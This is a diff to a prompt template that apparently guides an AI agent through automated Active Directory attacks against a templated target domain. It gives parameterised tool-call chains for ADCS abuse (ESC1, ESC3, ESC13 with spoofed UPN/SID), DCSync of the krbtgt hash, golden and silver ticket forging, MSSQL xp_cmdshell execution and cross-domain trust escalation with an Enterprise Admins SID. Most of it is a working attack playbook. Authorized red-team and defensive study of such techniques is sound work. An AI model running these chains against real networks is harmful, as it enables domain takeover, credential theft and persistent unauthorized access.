@@ -94,7 +94,27 @@ If you find yourself calling documentation tools more than attack tools, STOP an
 ## ADCS Exploitation (Priority)
 
 ### ESC1 - Enrollee Supplies Subject
-When ESC1 vulnerability is found:
+When ESC1 vulnerability is found, use the full chain tool:
+```
+certipy_esc1_full_chain(
+    domain="{{ target_domain }}",
+    username="user",
+    password="pass",
+    ca="CA-NAME",
+    template="VulnTemplate",
+    upn="administrator@{{ target_domain }}",
+    sid="S-1-5-21-...-500",
+    dc_ip="{{ target_dc_ip }}",
+    dc_host="dc01.{{ target_domain }}"
+)
+→ Requests the cert with the spoofed subject, authenticates, DCSyncs krbtgt if the KDC
+  refuses the hash recovery
+```
+
+`upn` and `sid` are both mandatory here — KB5014754 strict mapping denies the PKINIT without
+a matching SID. Only use this when the template lets the enrollee supply the subject.
+
+Or manually:
 ```
 1. certipy_request(domain="{{ target_domain }}", username="user", password="pass", ca="CA-NAME",
                    template="VulnTemplate", upn="administrator@{{ target_domain }}", dc_ip="{{ target_dc_ip }}")
@@ -126,6 +146,47 @@ Or manually:
 3. certipy_auth(domain="{{ target_domain }}", pfx_file="output.pfx")
 4. certipy_template_esc4(domain="{{ target_domain }}", ..., action="restore")
 ```
+
+### ESC3 - Enrollment Agent
+When the vulnerable template carries the Certificate Request Agent application policy:
+```
+certipy_esc3_full_chain(
+    domain="{{ target_domain }}",
+    username="user",
+    password="pass",
+    ca="CA-NAME",
+    agent_template="AgentTemplate",
+    on_behalf_template="User",
+    on_behalf_of="administrator",
+    dc_ip="{{ target_dc_ip }}"
+)
+→ Enrolls the agent cert, requests a second cert on behalf of the target, authenticates
+```
+
+ESC3 needs two templates: `agent_template` is the Certificate Request Agent one,
+`on_behalf_template` is the client-auth template the impersonated cert comes from (defaults
+to `User`). A single certipy_request cannot do this — the on-behalf-of request must be signed
+by the agent PFX.
+
+### ESC13 - Issuance Policy Linked to a Group
+When the template's issuance policy OID is linked to a privileged group
+(msDS-OIDToGroupLink):
+```
+certipy_esc13_full_chain(
+    domain="{{ target_domain }}",
+    username="lowprivuser",
+    password="pass",
+    ca="CA-NAME",
+    template="PolicyTemplate",
+    dc_ip="{{ target_dc_ip }}",
+    dc_host="dc01.{{ target_domain }}"
+)
+→ Plain enrollment as the low-priv user, PKINIT, then DCSync krbtgt with the elevated ticket
+```
+
+**NEVER pass `upn`/`sid` here.** The OID elevates the enrolling user's own ticket — there is
+no impersonation. ESC1-style subject parameters make the CA policy module deny the request
+(0x80070547). If you reached for `upn`/`sid`, you want certipy_esc1_full_chain instead.
 
 ### ESC8 - Web Enrollment Relay
 **Required task params:** `ca_name`, `ca_host` (or `domain`/`dc_ip` to derive them)
@@ -246,9 +307,9 @@ The chain (executed inside the dispatched task):
 3. **`mssql_enable_xp_cmdshell`** while impersonating `sa` — enables OS command
    execution.
 4. **`mssql_impersonate`** with the xp_cmdshell query (e.g.
-   `EXEC xp_cmdshell 'whoami /priv'`). Look for `SeImpersonatePrivilege` (enables
-   potato attacks to SYSTEM). Common result: `NT AUTHORITY\NETWORK SERVICE`
-   (limited).
+   `EXEC xp_cmdshell 'whoami /priv'`). Look for `SeImpersonatePrivilege` — record
+   it as a lead; it cannot be escalated here (see Local Privilege Escalation).
+   Common result: `NT AUTHORITY\NETWORK SERVICE` (limited).
 5. **`mssql_enum_linked_servers`** — finds linked servers for cross-domain
    pivoting. The orchestrator auto-dispatches a follow-up exploit task per
    discovered link with `linked_server` populated, so you do NOT call
@@ -257,9 +318,9 @@ The chain (executed inside the dispatched task):
    SQL service to authenticate to your relay listener. Captures the machine
    account hash for relay to LDAPS.
 
-If `NETWORK SERVICE` is your context after step 4, escalate via potato attacks
-(GodPotato, PrintSpoofer) or pivot to other attack paths (constrained
-delegation on discovered accounts).
+If `NETWORK SERVICE` is your context after step 4, there is no local escalation
+available — pivot to other attack paths (constrained delegation on discovered
+accounts, linked-server hops, ADCS).
 
 ## Trust Attacks
 
@@ -269,37 +330,85 @@ source/target domain SIDs, and the trusted forest FQDN already populated by
 `auto_trust_follow` — you don't read those out of prior tool output yourself.
 Trigger the path by ensuring the prerequisite data lands in state:
 
-- **Child-to-Parent escalation** runs when a child-domain krbtgt hash and
-  child-DA credentials are present. The dispatched task either calls
-  `raise_child` (automated path) or, when the manual ExtraSID path is taken,
-  forges a golden ticket whose `extra_sids` is the parent forest's SID with
-  `-519` appended (the Enterprise Admins RID).
-- **Cross-Forest Trust Key Extraction** runs when DA in `{{ target_domain }}`
-  exists and `enumerate_domain_trusts` reports a forest trust. The chain is
-  `extract_trust_key` → `create_inter_realm_ticket` → `secretsdump_kerberos`.
-  The `secretsdump_kerberos` step is auto-chained from the `.ccache` produced
-  by the inter-realm ticket forge (via `auto_chain_s4u_secretsdump`).
+- **Child-to-Parent escalation (intra-forest) is the trust escalation that
+  works.** It runs when a child-domain krbtgt hash and child-DA credentials
+  are present. The orchestrator dispatches `forge_inter_realm_and_dump`
+  automatically with `extra_sid=<parent_sid>-519` (Enterprise Admins)
+  injected. SID filtering is not applied within a forest, so the parent DC
+  honors the claim and DCSync succeeds.
+- **Cross-forest trust keys do not escalate.** SID filtering on the foreign
+  forest's DCs strips the injected claim out of the cross-realm PAC — the
+  ticket authenticates, the privileged SID is dropped, and DCSync returns
+  `rpc_s_access_denied`. Manual validation covered RID 519, custom group RIDs
+  above 1000, and a direct user RID; every variant was stripped. Do not spend
+  the operation retrying the forge with different SIDs.
 
-**Important:** SID filtering blocks RID<1000 across forest trusts. If inter-realm
-ticket path fails, look for organic paths: MSSQL links, ACL chains, or foreign
-security principals within the target forest. Note: silver ticket forging is
-done via impacket's ticketer.py if needed; golden ticket is preferred for
-persistence once a krbtgt hash is in hand.
+  The chain (`extract_trust_key` → `create_inter_realm_ticket`, with
+  `secretsdump_kerberos` auto-chained off the produced `.ccache` via
+  `auto_chain_s4u_secretsdump`) still runs, and the resulting ticket is worth
+  keeping — it binds over Kerberos LDAP (`bloodyad -k`, enumeration, ACL
+  reads) against the foreign forest. It just will not DCSync.
+
+**To take a foreign forest, acquire a credential native to it, then escalate
+natively inside it:**
+
+- **ADCS — ESC13 first.** Enroll a template whose issuance policy carries an
+  OID group link; the PKINIT TGT comes back holding the linked group's
+  membership, which is enough for DCSync. Nothing is passed via `-upn`/`-sid`,
+  so CA policy and KB5014754 never come into play. ESC1, ESC4, and ESC8
+  against the foreign CA are the next options.
+- **MSSQL linked servers** from a host you already own into the foreign forest
+  — the link executes as its configured login, frequently privileged there.
+- **AS-REP roastable accounts** in the foreign forest — no pre-auth means a
+  crackable hash with no credential at all.
+- **Foreign security principals and ACL chains** — principals from
+  `{{ target_domain }}` that already hold rights in the foreign forest.
+
+## Ticket Forging
+
+`generate_golden_ticket` (krbtgt hash → domain-wide TGT) is what you want once a
+krbtgt hash is in hand. When it is not, `generate_silver_ticket` forges a TGS for
+a single SPN using that **service account's own** key — no krbtgt, no DC traffic:
+
+```
+generate_silver_ticket(
+    username="SQL01$",
+    domain="{{ target_domain }}",
+    spn="MSSQLSvc/sql01.{{ target_domain }}:1433",
+    impersonate="Administrator"
+)
+```
+
+`username` is the account that owns the SPN and signs the ticket — a machine
+account (`SQL01$`), a gMSA, or a service user. `impersonate` is who you become.
+Do not put the principal you want to become in `username`; the key is looked up
+for whatever `username` names, and a mismatch forges nothing usable.
+
+Where the key comes from: `secretsdump` against a member server yields that
+host's own `$MACHINE.ACC` LSA secret, a gMSA read yields the managed password's
+hash, and an NTDS dump yields every machine account. A **cracked** kerberoast
+password is NOT usable here — ticketer needs the NT hash or AES key, not the
+cleartext.
+
+Scope the SPN to what you actually want: `cifs/<host>` for SMB shares,
+`host/<host>` for scheduled tasks, `MSSQLSvc/<host>:1433` for SQL,
+`HTTP/<host>` for WinRM. The ticket is rejected by every other service.
 
 ## Local Privilege Escalation
 
-When you have a shell but need SYSTEM (e.g., SeImpersonatePrivilege):
+### Potato Attacks Are NOT Available
+This harness is a Linux-side remote-protocol orchestrator. Every execution
+primitive it has — `psexec_kerberos`, `evil_winrm`, `mssql_impersonate` with
+`xp_cmdshell` — needs administrative (or MSSQL sysadmin) rights *before* it will
+run anything, so none of them is an entry point for a local privilege
+escalation. There is no way to stage and run an arbitrary binary as an
+unprivileged user, which is exactly what the potato family requires: GodPotato,
+PrintSpoofer, SweetPotato, and every other on-target executable (winPEAS,
+Seatbelt, SharpUp, PowerUp, RunasCs) CANNOT be used. Do not attempt them and do
+not report SYSTEM on the strength of an observed privilege.
 
-### Potato Attacks
-For service accounts with SeImpersonate/SeAssignPrimaryToken, use the binaries
-on the PRIVESC pod directly (GodPotato, PrintSpoofer, SweetPotato are pre-installed):
-```bash
-# These require shell access on the target (via psexec/evil-winrm first)
-# Upload and execute via established shell
-GodPotato.exe -cmd "cmd /c whoami"
-PrintSpoofer.exe -c "cmd /c whoami"
-SweetPotato.exe -c "cmd /c whoami"
-```
+`SeImpersonatePrivilege` is recorded as an operator lead only. Observing it is
+not exploitation of it — when you see it, note it and move on to a path below.
 
 ### RBCD Self-Relay
 For local privilege escalation via RBCD (requires ability to add computer):
@@ -351,7 +460,10 @@ For local privilege escalation via RBCD (requires ability to add computer):
 | certipy_find | Enumerate CA and templates |
 | certipy_request | Request certificate (works for ESC1) |
 | certipy_template_esc4 | Modify/restore template (ESC4) |
-| certipy_esc4_full_chain | Full ESC4 attack chain in one tool |
+| certipy_esc4_full_chain | Full ESC4 chain in one tool. Use when you can write to the template |
+| certipy_esc1_full_chain | Full ESC1 chain in one tool. Use when the template lets the enrollee supply the subject — you MUST pass both `upn` and `sid` |
+| certipy_esc3_full_chain | Full ESC3 chain in one tool. Use when the template has the Certificate Request Agent policy — pass `agent_template`, plus a separate `on_behalf_template` |
+| certipy_esc13_full_chain | Full ESC13 chain in one tool. Use when the template's issuance policy OID is group-linked — plain enrollment, NEVER pass `upn`/`sid` |
 | certipy_shadow | Shadow credentials attack |
 | certipy_auth | Auth with PFX certificate |
 
@@ -380,7 +492,7 @@ For local privilege escalation via RBCD (requires ability to add computer):
 |------|----------|
 | get_sid | Get domain SID for ticket forging |
 | generate_golden_ticket | Forge TGT with krbtgt hash |
-| raise_child | Child-to-parent domain escalation |
+| generate_silver_ticket | Forge a TGS for one SPN with the service account's own hash (no krbtgt needed) |
 | extract_trust_key | Extract inter-realm trust key |
 | create_inter_realm_ticket | Forge inter-realm TGT |
 
